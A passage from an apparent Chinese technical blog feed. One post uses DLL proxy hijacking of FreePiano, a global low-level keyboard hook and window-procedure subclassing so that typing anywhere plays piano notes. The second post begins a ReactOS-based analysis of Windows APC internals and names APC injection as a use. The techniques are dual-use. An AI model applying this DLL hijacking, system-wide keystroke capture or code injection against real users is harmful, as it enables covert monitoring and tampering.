<p>然后就用depends看了下freepiano的导入信息，发现几个可以劫持的（dsound.dll，d3d9.dll等），简单代码确认了一下，freepiano可以劫持这两个模块，选择了d3d9.dll（函数少）。</p> <p><img src="/img/freepiano_2.png" alt="img"></p> <p>然后偷懒用了aheadlib导出了d3d9.dll的导出函数信息，简单方便，飞快得就搞定了劫持。</p> <p>代码很简单，就贴一点（都不需要手写）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">// 导出函数</div><div class="line">#pragma comment(linker, &quot;/EXPORT:Direct3DShaderValidatorCreate9=_AheadLib_Direct3DShaderValidatorCreate9,@1&quot;)</div><div class="line">#pragma comment(linker, &quot;/EXPORT:PSGPError=_AheadLib_PSGPError,@2&quot;)</div><div class="line">#pragma comment(linker, &quot;/EXPORT:PSGPSampleTexture=_AheadLib_PSGPSampleTexture,@3&quot;)</div><div class="line">...</div><div class="line">// 导出函数</div><div class="line">ALCDECL AheadLib_Direct3DShaderValidatorCreate9(void)</div><div class="line">&#123;</div><div class="line"> // 保存返回地址</div><div class="line"> __asm POP m_dwReturn[0 * TYPE long];</div><div class="line"></div><div class="line"> // 调用原始函数</div><div class="line"> GetAddress(&quot;Direct3DShaderValidatorCreate9&quot;)();</div><div class="line"></div><div class="line"> // 转跳到返回地址</div><div class="line"> __asm JMP m_dwReturn[0 * TYPE long];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <p>一试，OK，模块起来了，freepiano正常工作。</p> <p><img src="/img/freepiano_3.png" alt="img">)</p> <h2 id="2-安装钩子"><a href="#2-安装钩子" class="headerlink" title="2. 安装钩子"></a>2. 安装钩子</h2><p>选择了安装全局WH_KEYBOARD钩子，这个代码网上也太多了，就不细说了，看看就行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">//安装钩子</div><div class="line">BOOL Hook(HMODULE hMod)</div><div class="line">&#123;</div><div class="line"> g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hMod, 0);</div><div class="line"> return g_Hook?TRUE:FALSE;</div><div class="line">&#125;</div><div class="line">//卸载钩子</div><div class="line">VOID Unhook()</div><div class="line">&#123;</div><div class="line"> if(g_Hook)</div><div class="line"> &#123;</div><div class="line">  UnhookWindowsHookEx(g_Hook);</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line">//钩子函数，劫持键盘消息</div><div class="line">LRESULT CALLBACK KeyboardProc(  int code,       // hook code</div><div class="line">         WPARAM wParam,  // virtual-key code</div><div class="line">         LPARAM lParam   // keystroke-message information</div><div class="line">         )</div><div class="line">&#123; </div><div class="line"> if(code == HC_ACTION)</div><div class="line"> &#123;</div><div class="line">  SendKeyMsg(wParam, lParam);</div><div class="line"> &#125;</div><div class="line"> return CallNextHookEx(g_Hook, code, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <h2 id="3-发送按键信息给freepiano"><a href="#3-发送按键信息给freepiano" class="headerlink" title="3. 发送按键信息给freepiano"></a>3. 发送按键信息给freepiano</h2><p>首先想到的就是在钩子函数里给freepiano发送WM_KEYDOWN/WM_KEYUP消息就行了。</p> <p>先找到freepiano的窗口，spy++上，找到窗口标题和类型信息，然后代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">HWND hwnd = FindWindow(&quot;FreePianoMainWindow&quot;, &quot;Wispow Freepiano 2&quot;);</div><div class="line">if(hwnd == NULL)</div><div class="line">&#123;</div><div class="line"> hwnd =  FindWindow(&quot;FreePianoMainWindow&quot;, NULL);</div><div class="line"> if(hwnd == NULL)</div><div class="line"> &#123;</div><div class="line">  hwnd =  FindWindow(NULL, &quot;Wispow Freepiano 2&quot;);</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <p>然后就是发消息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">if(hwnd)</div><div class="line">&#123;</div><div class="line"> SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE);</div><div class="line"> if(keydown)</div><div class="line"> &#123;</div><div class="line">  keydown = false;</div><div class="line">  PostMessage(hwnd, WM_KEYDOWN, wParam, lParam);</div><div class="line"> &#125;else</div><div class="line"> &#123;</div><div class="line">  keydown = true;</div><div class="line">  PostMessage(hwnd, WM_KEYUP, wParam, lParam);</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <p>测试，失败了，没有预想的效果。</p> <p>分析原因：</p> <ol> <li>Post发送消息失败。但是通过spy++抓消息看到freepiano是收到了消息的。那就不是这个原因。</li> <li>freepiano校验了窗口是否激活？然后就用上面每次置顶试了一下，依然不行。</li> <li>freepiano使用了GetKeyState之类的函数检查按键状态，通过ida简单看了一下导入表，没有相关函数（没有深究是否显示导入了）。</li> <li>用ida看了下freepiano的窗口消息处理，看是否有什么过滤</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">v7.lpfnWndProc = (WNDPROC)xxx_main_wndproc_41D070; //窗口响应函数</div><div class="line">v7.cbClsExtra = 0;</div><div class="line">v7.cbWndExtra = 0;</div><div class="line">v7.hInstance = GetModuleHandleA(0);</div><div class="line">v7.hIcon = LoadIconA(v1, (LPCSTR)0xA);</div><div class="line">v7.hCursor = 0;</div><div class="line">v7.hbrBackground = 0;</div><div class="line">v7.lpszMenuName = 0;</div><div class="line">v7.lpszClassName = &quot;FreePianoMainWindow&quot;;</div></pre></td></tr></table></figure> <p>然后发现居然没有对WM_KEYDOWN/WM_KEYUP/WM_CHAR之类的消息进行处理，那是怎么接受的按键信息</p> <p>继续用ida看是否有钩子之类的处理，果然，导入表中明晃晃的SetWindowsHookEx，进入一看，一个WM_KEYBOARD_LL局部钩子</p> <p><img src="/img/freepiano_4.png" alt="img"></p> <p>进钩子函数一下，各种按键状态记录的处理，不深究了。基本确认他使用这种方式来接受按键信息。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">v6 = (unsigned __int8)byte_4F6DC8[scanCode];</div><div class="line"> if ( (unsigned int)(v6 - 1) &gt; 0x6A )</div><div class="line">   goto LABEL_23;</div><div class="line"> if ( (unsigned __int8)byte_4F6ED0[v6] != pressed_0 )</div><div class="line"> &#123;</div><div class="line">   byte_4F6ED0[v6] = pressed_0;</div><div class="line">   sub_449B20(v6, pressed_0 != 0);</div><div class="line"> &#125;</div><div class="line"> if ( (_BYTE)dword_4F6DC0</div><div class="line">   || BYTE1(dword_4F6DC0) &amp;&amp; (v6 == &apos;D&apos; || v6 == &apos;H&apos;)</div><div class="line">   || BYTE2(dword_4F6DC0) &amp;&amp; (byte_4F6F15 || byte_4F6F17) &amp;&amp; v6 == 28 )</div><div class="line">   result = 1;</div><div class="line"> else</div></pre></td></tr></table></figure> <h2 id="4-改变策略"><a href="#4-改变策略" class="headerlink" title="4. 改变策略"></a>4. 改变策略</h2><p>那就不能直接PostMessage发送消息了。</p> <p>修改我的钩子为WM_KEYBOARD_LL全局键盘钩子，消息和freepiano完全一样了</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">g_Hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hMod, 0);</div></pre></td></tr></table></figure> <p>钩子函数通过WM_COPYDATA打包数据，发送给freepiano</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK LowLevelKeyboardProc(  int nCode,     // hook code</div><div class="line">           WPARAM wParam, // message identifier  </div><div class="line">           LPARAM lParam  // message data</div><div class="line">           )</div><div class="line">&#123;</div><div class="line"> COPYDATASTRUCT CopyData = &#123;0&#125;;</div><div class="line"> KeyboardLL_Msg Msg = &#123;0&#125;;</div><div class="line"></div><div class="line"> Msg.nCode = nCode;</div><div class="line"> Msg.wParam = wParam;</div><div class="line"> memcpy(&amp;Msg.lParam, (char*)lParam, sizeof(KBDLLHOOKSTRUCT));</div><div class="line"></div><div class="line"> CopyData.cbData = sizeof(KeyboardLL_Msg);</div><div class="line"> CopyData.dwData = 0;</div><div class="line"> CopyData.lpData = &amp;Msg;</div><div class="line"></div><div class="line"> HWND hwnd = FindFreepiano();</div><div class="line"> if(hwnd)</div><div class="line"> &#123;</div><div class="line">  BOOL ret = SendMessage(hwnd, WM_COPYDATA, (WPARAM)hwnd, (LPARAM)&amp;CopyData);</div><div class="line"> &#125;</div><div class="line"> return CallNextHookEx(g_Hook, nCode, wParam, lParam);</div><div class="line">&#125;</div><div class="line">typedef struct _KeyboardLL_Msg</div><div class="line">&#123;</div><div class="line"> int nCode;</div><div class="line"> WPARAM wParam;</div><div class="line"> KBDLLHOOKSTRUCT lParam;</div><div class="line">&#125;KeyboardLL_Msg, *PKeyboardLL_Msg;</div></pre></td></tr></table></figure> <p>通过SetWindowLong挂钩freepiano的窗口响应函数，增加处理WM_COPYDATA，来接受全局键盘信息，找到freepiano的钩子函数地址A，然后接受到WM_COPYDATA之后，直接调用A，把键盘信息给freepiano</p> <p>通过一个线程，循环查找freepianp窗口（可能还没起来），然后hook窗口响应函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">void HookWinProc()</div><div class="line">&#123;</div><div class="line"> while(1)</div><div class="line"> &#123;</div><div class="line">  HWND hwnd = FindFreepiano();</div><div class="line">  if(hwnd)</div><div class="line">  &#123;</div><div class="line">   g_WndProc = (pfn_WindProc)GetWindowLong(hwnd, GWL_WNDPROC);</div><div class="line">   if(g_WndProc)</div><div class="line">   &#123;</div><div class="line">    SetWindowLong(hwnd, GWL_WNDPROC, (LONG)fakeWindowProc);</div><div class="line">    break;</div><div class="line">   &#125;</div><div class="line">  &#125;</div><div class="line">  Sleep(10);</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <p>自己的函数中加入对WM_COPYDATA的消息处理，调用freepiano的钩子函数g_LowLevelKeyboardProc发键盘消息过去。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">LRESULT WINAPI fakeWindowProc(</div><div class="line">        HWND hWnd,              // handle to window</div><div class="line">        UINT Msg,               // message</div><div class="line">        WPARAM wParam,          // first message parameter</div><div class="line">        LPARAM lParam           // second message parameter</div><div class="line">        )</div><div class="line">&#123;</div><div class="line"> if(Msg == WM_COPYDATA)</div><div class="line"> &#123;</div><div class="line">  COPYDATASTRUCT* CopyData = (COPYDATASTRUCT*)lParam; </div><div class="line">  //if(CopyData-&gt;cbData == sizeof(KeyboardLL_Msg))</div><div class="line">  &#123;</div><div class="line">   KeyboardLL_Msg* Msg = (KeyboardLL_Msg*)CopyData-&gt;lpData;</div><div class="line">   g_LowLevelKeyboardProc(Msg-&gt;nCode, Msg-&gt;wParam, (LPARAM)&amp;Msg-&gt;lParam);</div><div class="line">  &#125;</div><div class="line"> &#125;</div><div class="line"> </div><div class="line"> return g_WndProc(hWnd, Msg, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>g_LowLevelKeyboardProc地址这里使用硬编码，图方便<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HMODULE hExe = GetModuleHandle(NULL);</div><div class="line">g_LowLevelKeyboardProc = (pfn_LowLevelKeyboardProc)((DWORD)hExe + (DWORD)g_LowLevelKeyboardProc);</div></pre></td></tr></table></figure></p> <p>功能到这里基本搞定。</p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>测试通过。</p> <p>手指立马不受控制的在编辑器里、浏览器、文件浏览器里各种按键，然后耳边响起了悠扬（忽略乱打的节奏的话）的钢琴声~~</p> <p>可能的优化：</p> <ol> <li>加入进程名单控制，不想在某些进程中听到琴声</li> <li>代码优化~~</li> </ol> <p>有兴趣的同学可以去折腾，我这里就不继续了~~</p> <p>转载请注明出处：<a href="http://anhkgg.github.io/coding-piano-hook">http://anhkgg.github.io/coding-piano-hook</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;突然想玩一下键盘弹曲子，就找到了&lt;a href=&quot;http://freepiano.tiwb.com/cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;freepiano&lt;/a&gt;，专业的东西不懂，就找了写简谱来玩玩，感觉挺不错的，哈哈~~&lt;/p&gt; &lt;p&gt;玩疯了之后，突然想到，我平时写代码，是不是可以弹出一段曲子呢，是不是心情会变得非常好，代码也写的更有节奏呢~~&lt;/p&gt; &lt;p&gt;说不定还搞出来一个什么《代码之歌》的钢琴曲~~ 嘎嘎&lt;/p&gt; &lt;p&gt;突然被自己这个想法吸引住了，不管咋样，每敲下代码的一个字符，后面想起了背景音乐，真是不错的，程序员也可以是“钢琴师”啊~~&lt;/p&gt; &lt;p&gt;有了想法，就开整！！！&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="WM_KEYBOARD_LL" scheme="https://anhkgg.github.io/tags/WM-KEYBOARD-LL/"/>            <category term="HOOK" scheme="https://anhkgg.github.io/tags/HOOK/"/>            <category term="freepiano" scheme="https://anhkgg.github.io/tags/freepiano/"/>            <category term="inject" scheme="https://anhkgg.github.io/tags/inject/"/>        </entry>      <entry>     <title>小Win，点一份APC（Apc机制详解）（一）</title>     <link href="https://anhkgg.github.io/win-apc-analyze1/"/>     <id>https://anhkgg.github.io/win-apc-analyze1/</id>     <published>2017-04-28T10:20:47.000Z</published>     <updated>2017-04-28T14:11:51.775Z</updated>          <content type="html"><![CDATA[<h1 id="翻开"><a href="#翻开" class="headerlink" title="翻开"></a>翻开</h1><p>翻开小Win的菜单，APC赫然在目…</p> <p>做工讲究，味道不错，是小Win的热门菜，我们点一来尝尝！</p> <p>吃了可以做很多事情…</p> <ul> <li>APC注入</li> <li>APC注入</li> <li>APC注入</li> <li>…</li> </ul> <a id="more"></a> <blockquote> <p>细节来自于<code>ReactOS</code>源码分析。</p> <p>如果对这个发神经的文风有任何不适，请谅解，因为我确实神经了</p> </blockquote> <h1 id="来一份APC"><a href="#来一份APC" class="headerlink" title="来一份APC"></a>来一份APC</h1><h2 id="ring3这么做的"><a href="#ring3这么做的" class="headerlink" title="ring3这么做的"></a>ring3这么做的</h2><p>点APC的正确姿势是使用<code>QueueUserApc</code>，不走寻常路的也可以使用<code>NtQueueApcThread</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">DWORD WINAPI QueueUserApc(PARCFUNC pfnApc, HANDLE hThread, ULONG_PTR dwData);</div><div class="line">&#123;</div><div class="line">    NtQueueApcThread(hThread, IntCallUserApc, pfnApc, dwData, NULL);    </div><div class="line">&#125;</div><div class="line"></div><div class="line">NTSTATUS NTAPI NtQueueApcThread(IN HANDLE ThreadHandle, </div><div class="line">                                IN PKNORMAL_ROUTINUE ApcRoutine,</div><div class="line">                                IN PVOID NormalContext, //pfnApc</div><div class="line">                                IN PVOID SystemArgument1, //dwData</div><div class="line">                                IN PVOID SystemArgument2</div><div class="line">                                );</div></pre></td></tr></table></figure> <p>也就是QueueUserApc内部是NtQueueApcThread做的，两者区别不大，当然，使用后者可以字节加点调料（不使用IntCallUserApc、换成自己的函数，函数参数也可以有三个了，而PARCFUNC只有一个参数）。</p> <p>小Win默认是通过统一的接口IntCallUserApc来调用的顾客指定的Apc函数。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">static void CALLBACK </div><div class="line">IntCallUserApc(PVOID Function, PVOID dwData, PVOID Arg3)</div><div class="line">&#123;</div><div class="line">    ((PAPCFUNC)Function)(dwData);</div><div class="line">&#125;</div></pre></td></tr></table></figure> <h2 id="ring0这么做的"><a href="#ring0这么做的" class="headerlink" title="ring0这么做的"></a>ring0这么做的</h2><p>NtQueueApcThread经过系统调用进入到ring0，一般人是看不到了…，我也是一般人来着，下面努力变成二班的…。</p> <h3 id="1-创建APC对象"><a href="#1-创建APC对象" class="headerlink" title="1. 创建APC对象"></a>1. 创建APC对象</h3><p>进了NtQueueApcThread，先通过KeInitializeApc初始化一个Apc对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/* Initialize the APC */</div><div class="line">KeInitializeApc(Apc,</div><div class="line">                &amp;Thread-&gt;Tcb, //KTHREAD</div><div class="line">                OriginalApcEnvironment,</div><div class="line">                PspQueueApcSpecialApc,</div><div class="line">                NULL,</div><div class="line">                ApcRoutine,</div><div class="line">                UserMode,</div><div class="line">                NormalContext);</div></pre></td></tr></table></figure></p> <p>APC对象结构定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">typedef struct _KAPC &#123;</div><div class="line">  UCHAR Type; //类型ApcObject</div><div class="line">  UCHAR SpareByte0;</div><div class="line">  UCHAR Size; //APC结构体大小</div><div class="line">  UCHAR SpareByte1;</div><div class="line">  ULONG SpareLong0;</div><div class="line">  struct _KTHREAD *Thread; //当前线程的KTHREAD</div><div class="line">  LIST_ENTRY ApcListEntry; //当前线程的APC链表</div><div class="line">  PKKERNEL_ROUTINE KernelRoutine; //</div><div class="line">  PKRUNDOWN_ROUTINE RundownRoutine; //</div><div class="line">  PKNORMAL_ROUTINE NormalRoutine; //</div><div class="line">  PVOID NormalContext; //用户定义的Apc函数</div><div class="line">  PVOID SystemArgument1; //用户Apc函数的参数</div><div class="line">  PVOID SystemArgument2;//</div><div class="line">  CCHAR ApcStateIndex; //Apc状态</div><div class="line">  KPROCESSOR_MODE ApcMode; //Apc所处的Mode，UserMode/KernelMode</div><div class="line">  BOOLEAN Inserted;     //是否已经被插入队列</div><div class="line">&#125; KAPC, *PKAPC, *RESTRICTED_POINTER PRKAPC;</div></pre></td></tr></table></figure></p> <p>根据KeInitializeApc传入参数，Apc被赋值如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Apc-&gt;KernelRoutine = PspQueueApcSpecialApc;</div><div class="line">Apc-&gt;RundownRoutine = NULL;</div><div class="line">Apc-&gt;NormalRoutine = ApcRoutine;//如果使用QueueUserApc，其实就是IntCallUserApc</div><div class="line">Apc-&gt;NormalContext = NormalContext;//pfnApc;//用户指定的Apc函数</div><div class="line">Apc-&gt;Type = ApcObject;</div><div class="line"></div><div class="line">//如果参数指定的是CurrentApcEnvironment，直接赋值Thread-&gt;ApcStateIndex</div><div class="line">Apc-&gt;ApcStateIndex = Thread-&gt;ApcStateIndex;</div><div class="line">//不是则</div><div class="line">Apc-&gt;ApcStateIndex = OriginalApcEnvironment;//</div><div class="line"></div><div class="line">//如果参数ApcRoutine不是NULL</div><div class="line">Apc-&gt;ApcMode = Mode;</div><div class="line">Apc-&gt;NormalContext = Context;</div><div class="line">//是NULL</div><div class="line">Apc-&gt;ApcMode = KernelMode;</div><div class="line">Apc-&gt;NormalContext = NULL;</div><div class="line"></div><div class="line">Apc-&gt;Inserted = False;</div></pre></td></tr></table></figure> <p>其中关于ApcStateIndex有4中值，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">// APC Environment Types</div><div class="line">//</div><div class="line">typedef enum _KAPC_ENVIRONMENT</div><div class="line">&#123;</div><div class="line">    OriginalApcEnvironment,//0</div><div class="line">    AttachedApcEnvironment,//1</div><div class="line">    CurrentApcEnvironment,//2</div><div class="line">    InsertApcEnvironment</div><div class="line">&#125; KAPC_ENVIRONMENT;</div></pre></td></tr></table></figure></p> <p>Apc-&gt;KernelRoutine总是有值的，被赋值为PspQueueApcSpecialApc，用于Apc结束时候释放Apc对象内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">VOID</div><div class="line">NTAPI</div><div class="line">PspQueueApcSpecialApc(IN PKAPC Apc,</div><div class="line">                      IN OUT PKNORMAL_ROUTINE* NormalRoutine,</div><div class="line">                      IN OUT PVOID* NormalContext,</div><div class="line">                      IN OUT PVOID* SystemArgument1,</div><div class="line">                      IN OUT PVOID* SystemArgument2)</div><div class="line">&#123;</div><div class="line">    /* Free the APC and do nothing else */</div><div class="line">    ExFreePool(Apc);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <h3 id="2-插入APC队列"><a href="#2-插入APC队列" class="headerlink" title="2. 插入APC队列"></a>2. 插入APC队列</h3><p>通过<code>KeInsertQueueApc</code>插入队列，在队列中等待被上菜…</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">KeInsertQueueApc(Apc,</div><div class="line">                          SystemArgument1,</div><div class="line">                          SystemArgument2,</div><div class="line">                          IO_NO_INCREMENT))</div></pre></td></tr></table></figure> <ol> <li>确认Apc未被插入，Thread-&gt;ApcQueueable为真</li> <li>Apc-&gt;Inserted = True</li> <li>然后通过<code>KiInsertQueueApc</code>插入队列，可能通过软中断或者唤醒线程得到执行Apc的机会</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">VOID</div><div class="line">FASTCALL</div><div class="line">KiInsertQueueApc(IN PKAPC Apc,</div><div class="line">                 IN KPRIORITY PriorityBoost)</div><div class="line">&#123;</div><div class="line"></div><div class="line">    if (Apc-&gt;ApcStateIndex == InsertApcEnvironment)</div><div class="line">    &#123;</div><div class="line">        Apc-&gt;ApcStateIndex = Thread-&gt;ApcStateIndex;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    //PKAPC_STATE ApcStatePointer[2];//说明ApcStateIndex只能是</div><div class="line">    //OriginalApcEnvironment,//0</div><div class="line">    //AttachedApcEnvironment,//1</div><div class="line">    //从Thread的ApcStatePointer取出对应的ApcState</div><div class="line">    ApcState = Thread-&gt;ApcStatePointer[(UCHAR)Apc-&gt;ApcStateIndex];</div><div class="line">    ApcMode = Apc-&gt;ApcMode;</div><div class="line">    </div><div class="line">    ASSERT(Apc-&gt;Inserted == TRUE);</div><div class="line">    </div><div class="line">    /* 插入队列的三种方式:</div><div class="line">     * 1) Kernel APC with Normal Routine or User APC = Put it at the end of the List</div><div class="line">     * 2) User APC which is PsExitSpecialApc = Put it at the front of the List</div><div class="line">     * 3) Kernel APC without Normal Routine = Put it at the end of the No-Normal Routine Kernel APC list</div><div class="line">     */</div><div class="line">    //PsExitSpecialApc</div><div class="line">    </div><div class="line">    if (Thread-&gt;ApcStateIndex == Apc-&gt;ApcStateIndex)</div><div class="line">    &#123;</div><div class="line">        if(当前线程 ) &#123;</div><div class="line">            if(KernelMode) &#123;</div><div class="line">                Thread-&gt;ApcState.KernelApcPending = TRUE;</div><div class="line">                if (!Thread-&gt;SpecialApcDisable)</div><div class="line">                    &#123;</div><div class="line">                        //中断线程当前执行六？？</div><div class="line">                        /* They&apos;re not, so request the interrupt */</div><div class="line">                        HalRequestSoftwareInterrupt(APC_LEVEL);</div><div class="line">                    &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            if(KernelMode) &#123;</div><div class="line">                Thread-&gt;ApcState.KernelApcPending = TRUE;</div><div class="line">                if (Thread-&gt;State == Running) HalRequestSoftwareInterrupt(APC_LEVEL);</div><div class="line">                else if(一堆条件)&#123;</div><div class="line">                    KiUnwaitThread(Thread, Status, PriorityBoost);//唤醒线程</div><div class="line">                &#125;</div><div class="line">                </div><div class="line">            &#125; else &#123;</div><div class="line">                if ((Thread-&gt;State == Waiting) &amp;&amp;</div><div class="line">                     (Thread-&gt;WaitMode == UserMode) &amp;&amp;</div><div class="line">                     ((Thread-&gt;Alertable) || //</div><div class="line">                      (Thread-&gt;ApcState.UserApcPending)))</div><div class="line">                &#123;</div><div class="line">                    /* Set user-mode APC pending */</div><div class="line">                    Thread-&gt;ApcState.UserApcPending = TRUE;</div><div class="line">                    Status = STATUS_USER_APC;</div><div class="line">                    KiUnwaitThread(Thread, 